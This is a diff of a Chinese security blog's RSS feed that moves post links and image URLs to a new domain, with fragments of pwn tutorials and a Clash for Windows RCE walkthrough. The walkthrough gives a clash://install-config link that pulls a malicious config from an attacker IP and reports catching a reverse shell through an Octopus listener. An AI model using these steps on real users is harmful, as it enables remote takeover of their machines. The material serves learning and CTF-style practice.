 &lt;p&gt;&lt;strong&gt;没后缀？加着玩玩试试呗&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;在域名的后面手动添加index后在添加php、jsp、py、asp等常见的后端编写语言，&lt;strong&gt;哪个能正常显示后端就是哪个语言编写的&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/5.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/5.jpg&#34;
 	width=&#34;1262&#34;
 	height=&#34;332&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/5_huca6f42bdb43e5261a6e62d2b4fc8c302_34959_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/5_huca6f42bdb43e5261a6e62d2b4fc8c302_34959_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/5_huca6f42bdb43e5261a6e62d2b4fc8c302_34959_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/5_huca6f42bdb43e5261a6e62d2b4fc8c302_34959_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;可见，百度是用PHP编写的&#34;
@@ -2294,10 +2294,10 @@
 &lt;blockquote&gt;
 &lt;p&gt;Tip: 现在一些大一点的网站，安全意识较高，都会隐藏相应的字段&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/6.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/6.jpg&#34;
 	width=&#34;1285&#34;
 	height=&#34;452&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/6_hu358432c5f38c49ead525937a041e8cfa_79429_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/6_hu358432c5f38c49ead525937a041e8cfa_79429_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/6_hu358432c5f38c49ead525937a041e8cfa_79429_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/6_hu358432c5f38c49ead525937a041e8cfa_79429_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;直接上图QvQ&#34;
@@ -2317,7 +2317,7 @@
 &lt;p&gt;又到了暴力出奇迹的时候了pvp&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;工具:漏了个大洞&lt;/a&gt;&lt;/p&gt;
 &lt;h3 id=&#34;burp抓包app&#34;&gt;Burp抓包APP&lt;/h3&gt;
-&lt;p&gt;没有安装burp的朋友们可以看&lt;a class=&#34;link&#34; href=&#34;https://blog.nanosec.site/posts/burppro/&#34; &gt;这篇文章&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;没有安装burp的朋友们可以看&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/burppro/&#34; &gt;这篇文章&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;如果各位有安卓模拟器，可以将模拟器的代理改成Burp的代理，然后可以给模拟器安装burp的证书。&lt;/p&gt;
 &lt;p&gt;如果不想用模拟器的话可以&lt;a class=&#34;link&#34; href=&#34;https://www.yuque.com/weiker/xiaodi/gq0iv9#jBift&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;自行参考这篇文章&lt;/a&gt;&lt;/p&gt;
@@ -2332,11 +2332,11 @@
         </item>
         <item>
         <title>PWN! PWN! PANG! Part5 --- ret2shellcode</title>
-        <link>https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/</link>
+        <link>https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/</link>
         <pubDate>Thu, 03 Mar 2022 05:50:08 -0500</pubDate>
         
-        <guid>https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part5 --- ret2shellcode" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part5&#34;&gt;PWN! PWN! PANG! Part5&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part5 --- ret2shellcode" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part5&#34;&gt;PWN! PWN! PANG! Part5&lt;/h1&gt;
 &lt;p&gt;呼～～好久没有继续更新PWN笔记了 &lt;del&gt;(最近学的Web安全的笔记也没写  逃)&lt;/del&gt;&lt;/p&gt;
 &lt;h2 id=&#34;资料投放&#34;&gt;资料投放&lt;/h2&gt;
 &lt;p&gt;老规矩，开头上资料= =&lt;/p&gt;
@@ -2399,10 +2399,10 @@
 &lt;p&gt;&lt;strong&gt;但是，我们貌似忽视了一个重要的问题&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;目标机一般都是完全打开&lt;strong&gt;ASLR&lt;/strong&gt;，也就意味着每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 我们无法通过反复试验来了解目标所在，因为每次的地址都会不同。&lt;/p&gt;
 &lt;p&gt;因此，很显然我们并不能找到ShellCode的地址，也就没办法返回到栈上的ShellCode&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/1.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/1.jpg&#34;
 	width=&#34;570&#34;
 	height=&#34;679&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/1_hucc68de3fc1d99772bd162ef606edf282_348427_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/1_hucc68de3fc1d99772bd162ef606edf282_348427_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/1_hucc68de3fc1d99772bd162ef606edf282_348427_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/1_hucc68de3fc1d99772bd162ef606edf282_348427_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;啊哦，行不通了= =&#34;
@@ -2437,10 +2437,10 @@
 &lt;p&gt;想到这里，我们&lt;strong&gt;不禁露出了恶毒的笑容&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;我们在数组&lt;code&gt;s&lt;/code&gt;中读入的shellcode会被程序同时放在&lt;code&gt;buf2&lt;/code&gt;中，这样我们通过溢出数组s,把&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;main&lt;/code&gt;函数的返回地址覆盖成&lt;code&gt;buf2&lt;/code&gt;的地址即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/2.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/2.jpg&#34;
 	width=&#34;622&#34;
 	height=&#34;696&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/2_hue7be457f48e13f9d356491fa28fefd38_391390_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/2_hue7be457f48e13f9d356491fa28fefd38_391390_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/2_hue7be457f48e13f9d356491fa28fefd38_391390_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part5---ret2shellcode/2_hue7be457f48e13f9d356491fa28fefd38_391390_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;思路.QAQ.&#34;
@@ -2485,11 +2485,11 @@
         </item>
         <item>
         <title>Clash猫猫RCE复现(弹shell)</title>
-        <link>https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/</link>
+        <link>https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/</link>
         <pubDate>Fri, 25 Feb 2022 23:27:12 -0500</pubDate>
         
-        <guid>https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/cover.jpg" alt="Featured image of post Clash猫猫RCE复现(弹shell)" /&gt;&lt;h1 id=&#34;clash-for-windows-rce弹shell&#34;&gt;Clash For Windows RCE弹Shell&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/cover.jpg" alt="Featured image of post Clash猫猫RCE复现(弹shell)" /&gt;&lt;h1 id=&#34;clash-for-windows-rce弹shell&#34;&gt;Clash For Windows RCE弹Shell&lt;/h1&gt;
 &lt;hr&gt;
 &lt;p&gt;小白:RCE是什么&lt;/p&gt;
 &lt;p&gt;&lt;del&gt;大佬:Reliable Computer Engineering (可靠的电脑工程)&lt;/del&gt;&lt;/p&gt;
@@ -2583,10 +2583,10 @@
 &lt;/ul&gt;
 &lt;hr&gt;
 &lt;p&gt;现在Octopus已经开始监听了QAQ,记下Octopus给出的链接，并把这个终端放一边 &lt;strong&gt;(别关掉)&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1.png&#34;
 	width=&#34;318&#34;
 	height=&#34;24&#34;
-	srcset=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1_hu0562a55e3665f92b18a7212d3551942f_8236_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1_hu0562a55e3665f92b18a7212d3551942f_8236_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1_hu0562a55e3665f92b18a7212d3551942f_8236_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1_hu0562a55e3665f92b18a7212d3551942f_8236_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;链接示例&#34;
@@ -2644,10 +2644,10 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;clash://install-config?url=http://Linux的ip/RCE.yaml&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;name=名字
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Tip:记得换IP和名字&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;然后在弹出的提示点&lt;code&gt;打开(Open)Clash For Windows&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2.jpg&#34;
 	width=&#34;672&#34;
 	height=&#34;232&#34;
-	srcset=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2_hua885acc8b430d11c5301250d668e065f_391390_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2_hua885acc8b430d11c5301250d668e065f_391390_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2_hua885acc8b430d11c5301250d668e065f_391390_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2_hua885acc8b430d11c5301250d668e065f_391390_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;提示&#34;
@@ -2660,10 +2660,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;进入&lt;code&gt;Profiles&lt;/code&gt;页面&lt;/p&gt;
 &lt;p&gt;选择&lt;code&gt;你取的名字(这里是RCE).yaml&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3.jpg&#34;
 	width=&#34;1695&#34;
 	height=&#34;852&#34;
-	srcset=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3_hu8045fe0fc415d8a0347b05d041892f72_86987_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3_hu8045fe0fc415d8a0347b05d041892f72_86987_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3_hu8045fe0fc415d8a0347b05d041892f72_86987_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3_hu8045fe0fc415d8a0347b05d041892f72_86987_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;RCE.yaml(建议实战的时候别用这名字  逃= =)&#34;
@@ -2675,10 +2675,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;切到&lt;code&gt;Proxies&lt;/code&gt;页面并点击那个&lt;code&gt;a&lt;/code&gt;(这一步不是必须的，因为这个RCE有些不稳定)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4.jpg&#34;
 	width=&#34;1594&#34;
 	height=&#34;751&#34;
-	srcset=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;嘛= =&#34;
@@ -2691,10 +2691,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;成功getshell-露出恶毒的笑容&#34;&gt;成功GetShell &lt;del&gt;(露出恶毒的笑容)&lt;/del&gt;&lt;/h3&gt;
 &lt;p&gt;Octopus收到了反弹的shell,可以 &lt;strong&gt;&amp;lt;为所欲为&amp;gt;&lt;/strong&gt; 了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh.jpg&#34;
 	width=&#34;1239&#34;
 	height=&#34;667&#34;
-	srcset=&#34;https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;西瓜shell&#34;
@@ -2721,11 +2721,11 @@
         </item>
         <item>
         <title>PWN! PWN! PANG! Part4 --- ret2text</title>
-        <link>https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/</link>
+        <link>https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/</link>
         <pubDate>Thu, 10 Feb 2022 22:54:20 -0500</pubDate>
         
-        <guid>https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part4 --- ret2text" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part4&#34;&gt;PWN! PWN! PANG! Part4&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part4 --- ret2text" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part4&#34;&gt;PWN! PWN! PANG! Part4&lt;/h1&gt;
 &lt;h2 id=&#34;必须有的前言&#34;&gt;必须有的前言&lt;/h2&gt;
 &lt;p&gt;从Part4开始我们就要正式进入实战部分了哦qaq,&lt;/p&gt;
 &lt;p&gt;本篇文章主要讲述最最简单的一种栈溢出利用姿势&lt;strong&gt;ret2text&lt;/strong&gt;&lt;/p&gt;
@@ -2800,10 +2800,10 @@
 &lt;p&gt;实现: 通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/NX.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/NX.png&#34;
 	width=&#34;965&#34;
 	height=&#34;505&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;关于内存中的ELF各部分的权限&#34;
@@ -2883,10 +2883,10 @@
 &lt;p&gt;如果是64位程序，则选择 &lt;code&gt;ida64.exe&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;同意使用协议&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/l.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/l.png&#34;
 	width=&#34;538&#34;
 	height=&#34;605&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;协议&#34;
@@ -2898,10 +2898,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;选择第一个(默认配置)然后ok&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/1.png&#34;
 	width=&#34;581&#34;
 	height=&#34;454&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;嘛= =&#34;
@@ -2916,10 +2916,10 @@
 &lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;TIP:  如你界面和我不相同请按空格键切换&lt;/strong&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/main.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/main.png&#34;
 	width=&#34;1602&#34;
 	height=&#34;797&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;主函数的反汇编&#34;
@@ -2963,10 +2963,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好家伙，直接双手呈上shell= =,&lt;/p&gt;
 &lt;p&gt;这看起来是某个程序员为了方便自己 &lt;del&gt;奇奇怪怪的意图&lt;/del&gt; 调试程序干的&amp;lt;好&amp;gt;事, 在程序了直接留下一个后门&lt;/p&gt;
 &lt;p&gt;现在我们的思路应该很清晰了，就是通过栈溢出篡改函数返回地址，劫持程序执行流，让其调用&lt;code&gt;get_shell()&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/s.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part4---ret2text/s.png&#34;
 	width=&#34;986&#34;
 	height=&#34;555&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/s_hu9786b2549c7d9b9bfe806264788a882a_29606_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/s_hu9786b2549c7d9b9bfe806264788a882a_29606_1024x0_resize_box_3.png 1024w&#34;
